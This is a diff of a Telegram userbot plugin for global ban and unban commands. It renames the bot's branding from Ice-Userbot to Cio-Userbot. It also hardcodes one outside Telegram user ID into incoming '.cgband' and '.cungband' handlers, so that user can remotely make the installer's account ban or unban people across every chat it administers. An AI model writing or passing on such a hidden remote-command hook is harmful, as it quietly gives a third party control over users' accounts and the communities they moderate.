@@ -42,7 +42,7 @@ async def handler(tele):
 
 
 @bot.on(ice_cmd(outgoing=True, pattern=r"gband(?: |$)(.*)"))
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cgband(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cgband(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
@@ -89,7 +89,7 @@ async def gben(userbot):
                     f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
                     f"**User ID:** `{user.id}`\n"
                     f"**Action:** `Global Banned`\n"
-                    f"**Powered by:** `❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ`"
+                    f"**Powered by:** `🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ`"
                 ) 
             except BaseException:
                 b += 1
@@ -108,12 +108,12 @@ async def gben(userbot):
         f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
         f"**User ID:** `{user.id}`\n"
         f"**Action:** `Global Banned by {owner}`\n"
-        f"**Powered by:** `❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ`"
+        f"**Powered by:** `🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ`"
     )
 
 
 @bot.on(ice_cmd(outgoing=True, pattern=r"ungband(?: |$)(.*)"))
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cungband(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cungband(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
@@ -172,5 +172,5 @@ async def gunben(userbot):
         f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
         f"**User ID:** `{user.id}`\n"
         f"**Action:** `UnGBanned by {owner}`"
-        f"**Powered by:** `❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ`"
+        f"**Powered by:** `🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ`"
     )
